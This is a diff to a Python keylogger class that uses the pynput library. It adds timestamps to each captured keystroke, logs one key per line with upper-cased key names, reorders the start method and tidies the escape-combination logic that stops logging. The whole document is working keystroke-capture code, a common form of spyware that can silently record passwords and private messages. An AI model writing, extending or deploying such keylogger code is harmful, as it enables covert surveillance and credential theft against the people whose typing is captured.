@@ -1,6 +1,6 @@
-import pynput.keyboard
-import pynput.mouse
 import threading
+import pynput
+from datetime import datetime
 
 KEY = pynput.keyboard.Key
 
@@ -12,15 +12,15 @@ class Keylogger:
         self.escape_combo = list(escape_combo)
         self.key_listener = pynput.keyboard.Listener(on_press=self.on_keyboard_event)
 
-    def start(self):
-        self.key_listener.start()
-        self.keylogger_running = True
-
     def get_key_log(self):
         return self.key_log
 
     def clear_key_log(self):
         self.key_log = ""
+
+    def start(self):
+        self.key_listener.start()
+        self.keylogger_running = True
 
     def stop_key_logger(self):
         self.key_listener.stop()
@@ -28,18 +28,19 @@ class Keylogger:
         threading.Thread.__init__(self.key_listener)
 
     def on_keyboard_event(self, event):
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         if event == KEY.backspace:
-            self.key_log += " [Bck] "
+            self.key_log += f"[{timestamp}] [BACKSPACE]\n"
         elif event == KEY.tab:
-            self.key_log += " [Tab] "
+            self.key_log += f"[{timestamp}] [TAB]\n"
         elif event == KEY.enter:
-            self.key_log += "\n"
+            self.key_log += f"[{timestamp}] [ENTER]\n"
         elif event == KEY.space:
-            self.key_log += " "
-        elif type(event) == KEY:
-            self.key_log += " [" + str(event)[4:] + "] "
+            self.key_log += f"[{timestamp}] [SPACE]\n"
+        elif isinstance(event, pynput.keyboard.Key):
+            self.key_log += f"[{timestamp}] [{event.name.upper()}]\n"
         else:
-            self.key_log += str(event)[1:len(str(event)) - 1]
+            self.key_log += f"[{timestamp}] {event.char}\n"
 
         self.check_escape_char(event)
 
@@ -47,6 +48,5 @@ class Keylogger:
         self.key_combo.append(key)
         if key != self.escape_combo[len(self.key_combo) - 1]:
             self.key_combo = []
-        else:
-            if self.key_combo == self.escape_combo:
-                self.stop_key_logger()
+        elif self.key_combo == self.escape_combo:
+            self.stop_key_logger()
